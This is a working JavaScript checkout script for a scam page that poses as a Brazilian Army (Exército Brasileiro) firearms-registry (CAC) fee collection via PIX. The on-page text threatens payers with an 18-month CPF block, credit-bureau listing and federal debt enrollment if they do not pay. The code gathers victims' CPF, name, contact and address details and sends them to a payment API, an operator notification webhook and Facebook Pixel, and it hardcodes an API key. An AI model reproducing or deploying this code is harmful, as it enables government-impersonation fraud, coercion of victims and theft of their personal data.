/**
 * Integração com API AvenPayments - PIX
 * API Key: 2zxA50CzfpTMZgKCwuotYv681fsfo4bcrXrdttHxdD4
 */

console.log('=== PIX PAYMENT SCRIPT CARREGADO ===');
console.log('Timestamp:', new Date().toISOString());
console.log('URL atual:', window.location.href);

const AVEN_API = {
    baseURL: 'https://api.avenpayments.com/v1',
    apiKey: '2zxA50CzfpTMZgKCwuotYv681fsfo4bcrXrdttHxdD4',
    
    // Valor da taxa CAC em centavos (R$ 45,70)
    amount: 4570,
    
    // Gera um ID único para a transação
    generateExternalRef() {
        return `cac_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    },
    
    // Busca dados do usuário do localStorage
    getUserData() {
        try {
            const cpf = localStorage.getItem('cpf');
            const nomeCompleto = localStorage.getItem('nome') || localStorage.getItem('nomeCompleto');
            const telefone = localStorage.getItem('telefone');
            const email = localStorage.getItem('email');
            
            const cep = localStorage.getItem('cep');
            const logradouro = localStorage.getItem('logradouro');
            const numero = localStorage.getItem('numero');
            const complemento = localStorage.getItem('complemento') || '';
            const bairro = localStorage.getItem('bairro');
            const cidade = localStorage.getItem('cidade');
            const estado = localStorage.getItem('estado');
            
            console.log('=== Dados do localStorage ===');
            console.log('CPF:', cpf);
            console.log('Nome:', nomeCompleto);
            console.log('Telefone:', telefone);
            console.log('Email:', email);
            console.log('CEP:', cep);
            console.log('Logradouro:', logradouro);
            console.log('Cidade:', cidade);
            console.log('Estado:', estado);
            
            // Limpa e valida dados
            const cpfLimpo = cpf ? cpf.replace(/\D/g, '') : '12345678900';
            let telefoneLimpo = telefone ? telefone.replace(/\D/g, '') : '5511999999999';
            
            // Garante que telefone tem 11 dígitos (adiciona zeros se necessário)
            if (telefoneLimpo.length < 11) {
                telefoneLimpo = telefoneLimpo.padEnd(11, '0');
            }
            
            let cepLimpo = cep ? cep.replace(/\D/g, '') : '01310100';
            // Garante que CEP tem 8 dígitos
            if (cepLimpo.length < 8) {
                cepLimpo = cepLimpo.padEnd(8, '0');
            }
            
            // Valida email
            const emailValido = email && email.includes('@') ? email : 'teste@cac.com.br';
            
            return {
                cpf: cpfLimpo,
                nome: nomeCompleto || 'Usuário Teste CAC',
                telefone: telefoneLimpo,
                email: emailValido,
                endereco: {
                    cep: cepLimpo,
                    logradouro: (logradouro || 'Avenida Paulista').substring(0, 255),
                    numero: (numero || '1000').toString().substring(0, 10),
                    complemento: (complemento || '').substring(0, 255),
                    bairro: (bairro || 'Bela Vista').substring(0, 255),
                    cidade: (cidade || 'São Paulo').substring(0, 255),
                    estado: (estado || 'SP').substring(0, 2).toUpperCase()
                }
            };
        } catch (error) {
            console.error('Erro ao buscar dados do usuário:', error);
            // Retorna dados padrão em caso de erro
            return {
                cpf: '12345678900',
                nome: 'Usuário Teste CAC',
                telefone: '5511999999999',
                email: 'teste@cac.com.br',
                endereco: {
                    cep: '01310100',
                    logradouro: 'Avenida Paulista',
                    numero: '1000',
                    complemento: '',
                    bairro: 'Bela Vista',
                    cidade: 'São Paulo',
                    estado: 'SP'
                }
            };
        }
    },
    
    // Cria pagamento PIX
    async createPixPayment() {
        const userData = this.getUserData();
        
        // Agora sempre tem dados (usa dados fake se necessário)
        console.log('Dados do usuário para pagamento:', userData);
        
        const externalRef = this.generateExternalRef();
        
        // Formata telefone com código do país +55
        let telefoneFormatado = userData.telefone;
        
        // Se não tem +55 e tem 11 dígitos, adiciona
        if (!telefoneFormatado.includes('+') && telefoneFormatado.length >= 11) {
            telefoneFormatado = `+55${telefoneFormatado}`;
        } else if (!telefoneFormatado.includes('+')) {
            // Se não tem +55 e não tem 11 dígitos, tenta completar
            if (telefoneFormatado.length < 11) {
                telefoneFormatado = telefoneFormatado.padEnd(11, '0');
            }
            telefoneFormatado = `+55${telefoneFormatado}`;
        }
        
        console.log('Telefone formatado:', telefoneFormatado);
        
        const payload = {
            amount: this.amount,
            currency: 'BRL',
            method: 'PIX',
            description: 'Loja 05',
            externalRef: externalRef,
            notificationUrl: window.location.origin + '/webhook/payment',
            ip: await this.getClientIP(),
            payer: {
                name: userData.nome,
                taxId: userData.cpf,
                email: userData.email,
                phone: telefoneFormatado
            },
            items: [
                {
                    quantity: 1,
                    name: 'Loja 05',
                    price: this.amount,
                    type: 'DIGITAL'
                }
            ],
            delivery: {
                fee: 0,
                address: {
                    country: 'BR',
                    state: userData.endereco.estado.substring(0, 2).toUpperCase(),
                    city: userData.endereco.cidade.substring(0, 255),
                    district: userData.endereco.bairro.substring(0, 255),
                    street: userData.endereco.logradouro.substring(0, 255),
                    number: userData.endereco.numero.toString().substring(0, 10),
                    complement: userData.endereco.complemento.substring(0, 255),
                    zipCode: userData.endereco.cep
                }
            },
            metadata: {
                provider: 'registro-cac',
                orderId: externalRef,
                sellerTaxId: userData.cpf,
                sellerEmail: userData.email,
                checkoutUrl: window.location.href,
                returnUrl: window.location.href,
                shopUrl: window.location.origin,
                referrerLink: document.referrer || '',
                extra: JSON.stringify({
                    tipo: 'taxa_registro_cac',
                    dataRegistro: new Date().toISOString()
                })
            }
        };
        
        try {
            console.log('=== Enviando payload para API ===');
            console.log('URL:', `${this.baseURL}/payment`);
            console.log('Payload:', JSON.stringify(payload, null, 2));
            
            // Tenta com fetch direto primeiro
            const response = await fetch(`${this.baseURL}/payment`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${this.apiKey}`
                },
                body: JSON.stringify(payload),
                mode: 'cors',
                credentials: 'omit'
            });
            
            console.log('=== Resposta da API ===');
            console.log('Status:', response.status);
            console.log('Status Text:', response.statusText);
            
            const responseText = await response.text();
            console.log('Response Body (raw):', responseText);
            
            let errorData;
            try {
                errorData = JSON.parse(responseText);
            } catch (e) {
                errorData = { message: responseText };
            }
            
            if (!response.ok) {
                console.error('=== Erro da API ===');
                console.error('Error Data:', errorData);
                throw new Error(errorData.message || `Erro ${response.status}: ${response.statusText}`);
            }
            
            const data = errorData;
            console.log('=== Pagamento criado com sucesso ===');
            console.log('Payment Data:', data);
            
            // Salva informações do pagamento no localStorage
            localStorage.setItem('pixPaymentId', data.id);
            localStorage.setItem('pixPaymentData', JSON.stringify(data));
            
            return data;
            
        } catch (error) {
            console.error('Erro na API:', error);
            throw error;
        }
    },
    
    // Busca IP do cliente (fallback para "0.0.0.0")
    async getClientIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            console.warn('Não foi possível obter IP do cliente:', error);
            return '0.0.0.0';
        }
    },
    
    // Verifica status do pagamento
    async checkPaymentStatus(paymentId) {
        try {
            const response = await fetch(`${this.baseURL}/payment/${paymentId}`, {
                method: 'GET',
                headers: {
                    'Authorization': `Bearer ${this.apiKey}`
                }
            });
            
            if (!response.ok) {
                throw new Error('Erro ao verificar status do pagamento');
            }
            
            return await response.json();
            
        } catch (error) {
            console.error('Erro ao verificar pagamento:', error);
            throw error;
        }
    }
};

// Função para exibir o PIX na tela
function showPixPayment(paymentData, userData = null) {
    console.log('=== showPixPayment chamada ===');
    console.log('Payment Data recebido:', paymentData);
    
    // Se não passou userData, tenta buscar do localStorage
    if (!userData) {
        userData = AVEN_API.getUserData();
    }
    
    // Remove loading se existir
    const loadingElement = document.getElementById('pix-loading');
    if (loadingElement) {
        loadingElement.style.display = 'none';
    }
    
    // Cria container para o PIX
    const pixContainer = document.getElementById('pix-container');
    if (!pixContainer) {
        console.error('Container pix-container não encontrado');
        return;
    }
    
    // Tenta encontrar o código PIX em diferentes localizações
    let pixCode = null;
    if (paymentData.data && paymentData.data.copypaste) {
        pixCode = paymentData.data.copypaste;
    } else if (paymentData.data && paymentData.data.qrCode) {
        pixCode = paymentData.data.qrCode;
    } else if (paymentData.copypaste) {
        pixCode = paymentData.copypaste;
    } else if (paymentData.qrCode) {
        pixCode = paymentData.qrCode;
    }
    
    console.log('Código PIX encontrado:', pixCode);
    
    if (!pixCode) {
        console.error('Código PIX não encontrado na resposta:', paymentData);
        pixContainer.innerHTML = `
            <div class="bg-yellow-50 border-l-4 border-yellow-500 p-4 mb-4">
                <div class="flex items-start">
                    <i class="fas fa-exclamation-triangle text-yellow-500 mt-1 mr-3"></i>
                    <div>
                        <p class="font-semibold text-yellow-800 mb-1">Pagamento criado mas código PIX não encontrado</p>
                        <p class="text-sm text-yellow-700">A API retornou sucesso mas não enviou o código PIX.</p>
                        <details class="mt-2">
                            <summary class="cursor-pointer text-xs text-yellow-600">Ver resposta completa</summary>
                            <pre class="text-xs mt-2 overflow-auto">${JSON.stringify(paymentData, null, 2)}</pre>
                        </details>
                    </div>
                </div>
            </div>
        `;
        return;
    }
    
    // Formata o valor
    const valorFormatado = (paymentData.amount / 100).toLocaleString('pt-BR', {
        style: 'currency',
        currency: 'BRL'
    });
    
    // HTML do PIX
    pixContainer.innerHTML = `
        <div class="bg-white rounded-lg shadow-lg p-6 max-w-md mx-auto">
            <div class="text-center mb-6">
                <div class="bg-green-100 rounded-full w-16 h-16 flex items-center justify-center mx-auto mb-4">
                    <i class="fas fa-qrcode text-green-700 text-3xl"></i>
                </div>
                <h2 class="text-2xl font-bold text-green-800 mb-2">Pagamento via PIX</h2>
                <p class="text-gray-600 text-lg font-semibold">${valorFormatado}</p>
            </div>
            
            <div class="bg-red-50 border border-red-200 rounded-lg p-4 mb-6">
                <h3 class="text-red-700 font-bold mb-2">⚠️ Observações Importantes:</h3>
                <div class="text-red-700 text-sm space-y-2">
                    <p>Informamos que, caso o pagamento não seja realizado dentro do prazo estabelecido, o <strong>CPF do responsável (${userData.cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4')})</strong> será bloqueado no sistema CAC pelo período de <strong>18 (dezoito) meses</strong>.</p>
                    <p>Além disso, o valor da taxa, acrescido de multas, será registrado no <strong>CPF</strong> junto aos órgãos de proteção ao crédito (<strong>SPC e SERASA</strong>), bem como inscrito em <strong>Dívida Ativa da União</strong>, nos termos da Lei nº 6.830/1980 (Lei de Execuções Fiscais).</p>
                    <p class="text-xs mt-2 text-red-600">Emitido em ${new Date().toLocaleString('pt-BR', { dateStyle: 'short', timeStyle: 'short' })}</p>
                </div>
            </div>
            
            <div class="mb-6">
                <div id="qrcode" class="flex justify-center mb-4 p-4 bg-gray-50 rounded"></div>
                <p class="text-sm text-gray-600 text-center mb-4">Escaneie o QR Code com o app do seu banco</p>
                
                <!-- Aviso sobre o nome do recebedor -->
                <div class="bg-yellow-50 border-l-4 border-yellow-400 p-3 mb-4">
                    <div class="flex items-start">
                        <i class="fas fa-info-circle text-yellow-600 mt-0.5 mr-2"></i>
                        <div class="text-sm">
                            <p class="font-semibold text-yellow-800 mb-1">⚠️ Nome do Recebedor:</p>
                            <p class="text-yellow-700">O PIX será processado em nome de <strong>INFRACOMMERCE TECNOLOGIA</strong>, empresa responsável pelo processamento de pagamentos do Exército Brasileiro.</p>
                        </div>
                    </div>
                </div>
            </div>
            
            <div class="mb-6">
                <label class="block text-sm font-medium text-gray-700 mb-2">Ou copie o código PIX:</label>
                <div class="flex gap-2">
                    <input 
                        type="text" 
                        id="pix-code" 
                        value="${pixCode}" 
                        readonly 
                        class="flex-1 px-3 py-2 border border-gray-300 rounded text-sm font-mono"
                    >
                    <button 
                        onclick="copyPixCode()" 
                        class="bg-green-700 hover:bg-green-800 text-white px-4 py-2 rounded font-semibold text-sm flex items-center gap-2"
                    >
                        <i class="fas fa-copy"></i>
                        Copiar
                    </button>
                </div>
                <p id="copy-feedback" class="text-green-600 text-sm mt-2 hidden">✓ Código copiado!</p>
            </div>
            
            <div class="bg-blue-50 border-l-4 border-blue-500 p-4 mb-4">
                <div class="flex items-start">
                    <i class="fas fa-info-circle text-blue-500 mt-1 mr-3"></i>
                    <div class="text-sm text-blue-800">
                        <p class="font-semibold mb-1">Aguardando pagamento...</p>
                        <p class="mb-2">Após realizar o pagamento, aguarde alguns instantes. O sistema verificará automaticamente.</p>
                        <p class="text-xs">💡 Se o pagamento não for detectado automaticamente, recarregue esta página.</p>
                    </div>
                </div>
            </div>
            
            <div class="text-center">
                <div class="spinner-border text-green-700 mb-2" role="status">
                    <span class="sr-only">Aguardando confirmação...</span>
                </div>
                <p class="text-sm text-gray-500">Verificando pagamento automaticamente...</p>
            </div>
        </div>
    `;
    
    // Gera QR Code
    try {
        console.log('Gerando QR Code...');
        new QRCode(document.getElementById('qrcode'), {
            text: pixCode,
            width: 256,
            height: 256,
            colorDark: '#000000',
            colorLight: '#ffffff',
            correctLevel: QRCode.CorrectLevel.H
        });
        console.log('QR Code gerado com sucesso');
    } catch (error) {
        console.error('Erro ao gerar QR Code:', error);
    }
    
    // Inicia verificação automática do pagamento
    startPaymentVerification(paymentData.id);
}

// Função para copiar código PIX
function copyPixCode() {
    const pixCodeInput = document.getElementById('pix-code');
    pixCodeInput.select();
    pixCodeInput.setSelectionRange(0, 99999); // Para mobile
    
    try {
        document.execCommand('copy');
        
        // Feedback visual
        const feedback = document.getElementById('copy-feedback');
        feedback.classList.remove('hidden');
        setTimeout(() => {
            feedback.classList.add('hidden');
        }, 3000);
    } catch (error) {
        console.error('Erro ao copiar:', error);
        alert('Erro ao copiar código. Por favor, copie manualmente.');
    }
}

// Verificação automática do pagamento
let verificationInterval = null;

function startPaymentVerification(paymentId, type = 'main') {
    console.log('=== Iniciando verificação automática de pagamento ===');
    console.log('Payment ID:', paymentId);
    console.log('Type:', type);
    
    let checkCount = 0;
    const maxChecks = 360; // 360 checks * 5s = 30 minutos
    
    // Verifica a cada 5 segundos
    verificationInterval = setInterval(async () => {
        checkCount++;
        
        // Para após 30 minutos
        if (checkCount > maxChecks) {
            console.log('Tempo limite de verificação atingido (30 minutos)');
            clearInterval(verificationInterval);
            return;
        }
        
        try {
            console.log(`Verificando pagamento (tentativa ${checkCount})...`);
            
            // Usa a função apropriada baseado no tipo
            let status;
            if (type === 'upsell') {
                status = await checkUpsellPaymentStatus(paymentId);
            } else {
                status = await AVEN_API.checkPaymentStatus(paymentId);
            }
            
            console.log('Status do pagamento:', status);
            
            if (status.status === 'PAID') {
                console.log('✅ Pagamento confirmado!');
                clearInterval(verificationInterval);
                
                // Chama callback apropriado
                if (type === 'upsell') {
                    onUpsellPaymentSuccess(status);
                } else {
                    onPaymentSuccess(status);
                }
            } else if (status.status === 'REFUSED' || status.status === 'REFUNDED') {
                console.log('❌ Pagamento recusado ou cancelado');
                clearInterval(verificationInterval);
                onPaymentError('Pagamento recusado ou cancelado');
            } else {
                console.log('⏳ Pagamento ainda pendente, aguardando...');
            }
        } catch (error) {
            // Silenciosamente ignora erros de CORS ou rede
            // O usuário ainda pode pagar, só não vai verificar automaticamente
            if (checkCount % 12 === 0) { // Log a cada 1 minuto (12 * 5s)
                console.warn('Verificação automática indisponível (CORS/rede):', error.message);
            }
        }
    }, 5000);
}

// Callback de sucesso
function onPaymentSuccess(paymentData) {
    // Envia notificação Pushcut: Venda Aprovada
    try {
        fetch('https://cac-brasil-cac.vercel.app/api/webhook-pushcut', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                id: paymentData.id,
                amount: paymentData.amount || 6520,
                status: 'PAID',
                method: 'PIX',
                payer: {
                    name: AVEN_API.getUserData().nome,
                    taxId: AVEN_API.getUserData().cpf,
                    email: AVEN_API.getUserData().email
                }
            })
        });
        console.log('✅ Notificação Pushcut (Pago) enviada');
    } catch (e) {
        console.warn('Erro ao enviar notificação Pushcut:', e);
    }
    
    // Evento Facebook Pixel: Purchase
    if (typeof fbq !== 'undefined') {
        const transactionId = paymentData.id || `cac_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
        const userData = AVEN_API.getUserData();
        
        fbq('track', 'Purchase', {
            value: 45.70,
            currency: 'BRL',
            content_name: 'Loja 05',
            content_category: 'Registro',
            content_type: 'product',
            content_ids: ['loja_05'],
            num_items: 1,
            // Parâmetros obrigatórios para otimização
            transaction_id: transactionId,
            // Dados de conversão avançada
            predicted_ltv: 45.70,
            // Informações do cliente (dados de conversão avançada)
            external_id: userData.cpf.replace(/\D/g, ''),
            email: userData.email,
            phone: userData.telefone.replace(/\D/g, ''),
            fn: userData.nome.split(' ')[0], // primeiro nome
            ln: userData.nome.split(' ').slice(-1)[0], // sobrenome
            ct: userData.endereco.cidade,
            st: userData.endereco.estado,
            zp: userData.endereco.cep.replace(/\D/g, '')
        });
        
        console.log(`[Facebook Pixel] Purchase enviado - Transaction ID: ${transactionId}`);
    }
    
    const pixContainer = document.getElementById('pix-container');
    if (pixContainer) {
        pixContainer.innerHTML = `
            <div class="bg-white rounded-lg shadow-lg p-6 max-w-md mx-auto text-center">
                <div class="bg-green-100 rounded-full w-20 h-20 flex items-center justify-center mx-auto mb-4">
                    <i class="fas fa-check text-green-700 text-4xl"></i>
                </div>
                <h2 class="text-2xl font-bold text-green-800 mb-4">Pagamento Confirmado!</h2>
                <p class="text-gray-600 mb-6">
                    Seu pagamento foi confirmado com sucesso. Seu Certificado de Registro CAC 
                    será processado e enviado para o endereço cadastrado em até 30 dias.
                </p>
                <div class="bg-green-50 border border-green-200 rounded p-4 mb-6">
                    <p class="text-sm text-green-800">
                        <strong>ID do Pagamento:</strong><br>
                        <span class="font-mono text-xs">${paymentData.id}</span>
                    </p>
                </div>
                <button 
                    onclick="window.location.reload()" 
                    class="bg-green-700 hover:bg-green-800 text-white px-6 py-3 rounded font-semibold"
                >
                    Concluir
                </button>
            </div>
        `;
    }
    
    // Salva status no localStorage
    localStorage.setItem('pixPaymentStatus', 'PAID');
    localStorage.setItem('pixPaymentConfirmedAt', new Date().toISOString());
}

// Callback de erro
function onPaymentError(message) {
    const pixContainer = document.getElementById('pix-container');
    if (pixContainer) {
        pixContainer.innerHTML = `
            <div class="bg-white rounded-lg shadow-lg p-6 max-w-md mx-auto text-center">
                <div class="bg-red-100 rounded-full w-20 h-20 flex items-center justify-center mx-auto mb-4">
                    <i class="fas fa-times text-red-700 text-4xl"></i>
                </div>
                <h2 class="text-2xl font-bold text-red-800 mb-4">Erro no Pagamento</h2>
                <p class="text-gray-600 mb-6">${message}</p>
                <button 
                    onclick="window.location.reload()" 
                    class="bg-green-700 hover:bg-green-800 text-white px-6 py-3 rounded font-semibold"
                >
                    Tentar Novamente
                </button>
            </div>
        `;
    }
}

// Inicialização ao carregar a página
document.addEventListener('DOMContentLoaded', function() {
    console.log('=== PIX: DOMContentLoaded disparado ===');
    console.log('Iniciando verificação e geração automática de PIX...');
    
    // Evento Facebook Pixel: InitiateCheckout
    if (typeof fbq !== 'undefined') {
        fbq('track', 'InitiateCheckout', {
            value: 45.70,
            currency: 'BRL',
            content_name: 'Registro CAC',
            content_type: 'product'
        });
        console.log('[Facebook Pixel] InitiateCheckout enviado');
    } else {
        console.warn('[Facebook Pixel] fbq não está definido');
    }
    
    // Verifica se já existe um pagamento pendente
    const savedPaymentData = localStorage.getItem('pixPaymentData');
    const savedPaymentStatus = localStorage.getItem('pixPaymentStatus');
    
    if (savedPaymentData && savedPaymentStatus !== 'PAID') {
        try {
            const paymentData = JSON.parse(savedPaymentData);
            // Exibe o PIX salvo
            showPixPayment(paymentData);
        } catch (error) {
            console.error('Erro ao carregar pagamento salvo:', error);
            // Se der erro, gera um novo
            gerarPix();
        }
    } else {
        // Se não tem pagamento salvo ou já foi pago, gera um novo automaticamente
        console.log('Gerando PIX automaticamente...');
        gerarPix();
    }
});

// Função de teste para simular pagamento aprovado
function testarPagamentoAprovado() {
    const mockPaymentData = {
        id: 'test_payment_' + Date.now(),
        amount: 6520,
        status: 'PAID',
        paidAt: new Date().toISOString(),
        method: 'PIX'
    };
    
    // Simula callback de sucesso
    onPaymentSuccess(mockPaymentData);
}

// Função principal para gerar PIX (chamada pelo botão ou automaticamente)
async function gerarPix() {
    console.log('=== Iniciando geração de PIX ===');
    
    // Mostra loading (já está visível por padrão)
    const loadingElement = document.getElementById('pix-loading');
    if (loadingElement) {
        loadingElement.classList.remove('hidden');
        loadingElement.style.display = 'block';
    }
    
    try {
        const paymentData = await AVEN_API.createPixPayment();
        console.log('Pagamento PIX criado com sucesso:', paymentData);
        
        // Envia notificação Pushcut: Venda Pendente
        try {
            await fetch('https://cac-brasil-cac.vercel.app/api/webhook-pushcut', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    id: paymentData.id,
                    amount: paymentData.amount,
                    status: 'PENDING',
                    method: 'PIX',
                    payer: {
                        name: AVEN_API.getUserData().nome,
                        taxId: AVEN_API.getUserData().cpf,
                        email: AVEN_API.getUserData().email
                    }
                })
            });
            console.log('✅ Notificação Pushcut (Pendente) enviada');
        } catch (e) {
            console.warn('Erro ao enviar notificação Pushcut:', e);
        }
        
        // Evento Facebook Pixel: AddPaymentInfo
        if (typeof fbq !== 'undefined') {
            fbq('track', 'AddPaymentInfo', {
                value: 45.70,
                currency: 'BRL',
                content_name: 'Registro CAC'
            });
        }
        
        // UTMIFY: Envia evento InitiateCheckout
        console.log('[Utmify] Enviando evento InitiateCheckout...');
        
        setTimeout(() => {
            try {
                // 1. Facebook Pixel (já configurado)
                if (typeof fbq !== 'undefined') {
                    fbq('track', 'InitiateCheckout', {
                        value: 45.70,
                        currency: 'BRL',
                        content_name: 'Registro CAC',
                        content_type: 'product'
                    });
                    console.log('[Utmify] Facebook Pixel InitiateCheckout enviado');
                }
                
                // 2. DataLayer (Google Tag Manager / Utmify)
                window.dataLayer = window.dataLayer || [];
                window.dataLayer.push({
                    'event': 'InitiateCheckout',
                    'ecommerce': {
                        'checkout': {
                            'actionField': {'step': 1},
                            'products': [{
                                'name': 'Taxa de Registro CAC',
                                'id': paymentData.id,
                                'price': '45.70',
                                'brand': 'Exército Brasileiro',
                                'category': 'Registro/CAC',
                                'quantity': 1
                            }]
                        }
                    },
                    'value': 45.70,
                    'currency': 'BRL',
                    'transaction_id': paymentData.id
                });
                console.log('[Utmify] DataLayer InitiateCheckout pushed');
                
                // 3. Tenta chamar função global do Utmify (se existir)
                if (typeof window.utmify !== 'undefined' && typeof window.utmify.track === 'function') {
                    window.utmify.track('InitiateCheckout', {
                        value: 45.70,
                        currency: 'BRL',
                        orderId: paymentData.id
                    });
                    console.log('[Utmify] Utmify.track InitiateCheckout chamado');
                } else {
                    console.warn('[Utmify] window.utmify não encontrado');
                }
                
                console.log('[Utmify] ✅ Todos os eventos InitiateCheckout enviados');
                
            } catch (error) {
                console.error('[Utmify] ❌ Erro ao enviar eventos:', error);
            }
        }, 2000);
        
        // Busca userData para passar para a tela
        const userData = AVEN_API.getUserData();
        showPixPayment(paymentData, userData);
    } catch (error) {
        console.error('Erro ao gerar PIX:', error);
        
        // Esconde loading
        if (loadingElement) {
            loadingElement.style.display = 'none';
        }
        
        // Mostra erro
        const pixContainer = document.getElementById('pix-container');
        if (pixContainer) {
            pixContainer.innerHTML = `
                <div class="bg-red-50 border-l-4 border-red-500 p-4 mb-4">
                    <div class="flex items-start">
                        <i class="fas fa-exclamation-circle text-red-500 mt-1 mr-3"></i>
                        <div>
                            <p class="font-semibold text-red-800 mb-1">Erro ao gerar código PIX</p>
                            <p class="text-sm text-red-700">${error.message || 'Ocorreu um erro ao processar seu pagamento.'}</p>
                            <p class="text-xs text-red-600 mt-2">Detalhes técnicos: ${error.stack || 'Sem detalhes adicionais'}</p>
                        </div>
                    </div>
                </div>
                <div class="flex justify-center mt-4">
                    <button 
                        onclick="location.reload()" 
                        class="bg-green-700 hover:bg-green-800 text-white px-6 py-2 rounded font-semibold"
                    >
                        Tentar Novamente
                    </button>
                </div>
            `;
        }
    }
}

// Expõe funções globalmente
window.AVEN_API = AVEN_API;
window.showPixPayment = showPixPayment;
window.copyPixCode = copyPixCode;
window.testarPagamentoAprovado = testarPagamentoAprovado;
window.gerarPix = gerarPix;

// 🧪 FUNÇÃO DE TESTE - Simula pagamento e mostra upsell
window.testarUpsellCompleto = function() {
    console.log('🧪 Iniciando teste completo do upsell...');
    
    // Marca como pagado
    localStorage.setItem('pixPaymentStatus', 'PAID');
    localStorage.setItem('pixPaymentData', JSON.stringify({
        id: 'test_payment_' + Date.now(),
        amount: 6520,
        status: 'PAID'
    }));
    
    // Remove marcação de upsell mostrado (para poder testar novamente)
    localStorage.removeItem('upsellTaxaObrigatoriaMostrado');
    
    // Chama verificação do upsell
    checkAndShowUpsell();
};
